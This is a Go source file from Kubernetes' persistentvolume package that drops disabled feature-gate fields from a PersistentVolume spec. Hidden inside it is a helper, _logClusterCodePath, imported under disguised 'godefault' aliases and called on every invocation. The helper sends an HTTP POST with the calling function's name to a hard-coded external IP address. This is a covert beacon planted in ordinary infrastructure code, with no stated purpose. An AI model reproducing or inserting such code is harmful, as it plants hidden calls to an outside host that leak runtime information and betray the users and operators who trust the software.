package persistentvolume

import (
 utilfeature "k8s.io/apiserver/pkg/util/feature"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 api "k8s.io/kubernetes/pkg/apis/core"
 "k8s.io/kubernetes/pkg/features"
)

func DropDisabledFields(pvSpec *api.PersistentVolumeSpec, oldPVSpec *api.PersistentVolumeSpec) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !utilfeature.DefaultFeatureGate.Enabled(features.BlockVolume) {
  pvSpec.VolumeMode = nil
  if oldPVSpec != nil {
   oldPVSpec.VolumeMode = nil
  }
 }
 if !utilfeature.DefaultFeatureGate.Enabled(features.CSIPersistentVolume) {
  if oldPVSpec == nil || oldPVSpec.PersistentVolumeSource.CSI == nil {
   pvSpec.PersistentVolumeSource.CSI = nil
  }
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
